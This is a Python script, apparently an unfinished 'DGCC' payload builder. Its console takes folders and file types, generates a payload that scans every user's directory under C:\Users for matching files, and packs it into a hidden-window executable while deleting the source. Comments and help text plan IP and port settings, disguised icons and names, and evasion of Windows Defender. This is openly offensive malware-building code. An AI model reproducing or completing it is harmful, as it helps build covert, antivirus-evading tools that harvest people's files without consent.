#Improvements for next project:
#1. Error ahndling with the console
#2. Add icons, changing the name of the payload
#3. make it go around windows defender / google 



##Lirbaries
from art import *
import sys
import os

#########Front End of the Porgram (Console)
def console():
    tprint("DGCC", "rnd-large")

    filetype =[]
    filepath = []


    while(True):
        commands = input(">>").split()

        #prints the help command 
        if(commands[0] == "help"):
            print("""
    help                             - gives the user a list of coammnds to use
    exit                             - quits out of the program
    filepath [list of desired paths] - give the program desired file path
    filetype [list of desired types] - give the program desired file type
    status                           - gives the user specified path/type
    reset                            - resets the given parameters
    delete [FT or FP] [name]         - deletes one of the parameters in FT OR FP
    setIp                            - sets the IP [work on]
    setPort                          - sets the port [work on]
    name                             - sets the name of the payload [work on]
    icon                             - generate the icon for the paylaod [work on]
    veil                             - payload to sneak out of windows defener [work on]
    run                              - give user the payload
                """)
            

        ##exist the program
        if(commands[0] == "exit"):
            break

        ##gives the user to be able to add the file path
        if(commands[0] == "filepath"):
            for i in range(len(commands[1:])):
                filepath.append(commands[i+1])

        ## gives the user to able to add file type
        if(commands[0] == "filetype"):
            for i in range(len(commands[1:])):
                filetype.append(commands[i+1])
                
        ## gives the user of the current parameters 
        if(commands[0] == "status"):
            print("filepath = " + str(filepath))
            print("filetype = " + str(filetype))

        ## resets the parameters
        if(commands[0] == "reset"):
            filetype = []
            filepath = []

        ##deletes an item in a list 
        if(commands[0] == "delete"):
            if(commands[1] == "filepath"):
                for i in range(len(commands[2:])):
                    filepath.remove(commands[i+2])

            if(commands[1] == "filetype"):
                for i in range(len(commands[2:])):
                    filetype.remove(commands[i+2])

            else:
                print("invalid input for args[1]")
                continue
                    
        ##cerates the payload
        if(commands[0] == "run"):
            return(filetype, filepath)
        
        


def payload(ft, fp):
    with open("payload.py", "w") as f:
        f.write("""
import psutil
import os
import time

filetype = """ + str(ft) + """
filepath = """ + str(fp) + """

user_list = psutil.users()

with open('allfiles.txt', 'w') as wf:
    for user in user_list: # files through the list of users 
        username = user.name

        ## goes thoguh all the path files inputs the user wants 
        for mulpaths in filepath:
            path = """ + "r" + """'C:\\Users'
            path = str(path) + """+ "'\\" + "\\'" + """ + str(username) + """ + "'\\" + "\\'" + """ + str(mulpaths)
            l = os.listdir(path)
            
            for root, dirs, files in os.walk(path):
                for f in files:
                    thefile = os.path.join(root, f)

                    ##gets the file type of the file the program
                    ## is looking at 
                    for i in range (len(thefile)):
                        if(thefile[-(i+1)] == "."):
                            check = thefile[-i:]

                            for types in filetype:
                                if(check == types):
                                    wf.write(os.path.join(root, f))
                                    wf.write('\\n')
                                else:
                                    continue
                            break
                                                                
""")


def makeexe():
    os.system('cmd /c pyinstaller --onefile --windowed payload.py')
    os. system('cmd /c del /f payload.py')


if __name__ == '__main__':
    (filetype, filepath) = console()
    payload(filetype, filepath)
    makeexe()



##Website that might help:
## https://mborgerson.com/creating-an-executable-from-a-python-script/

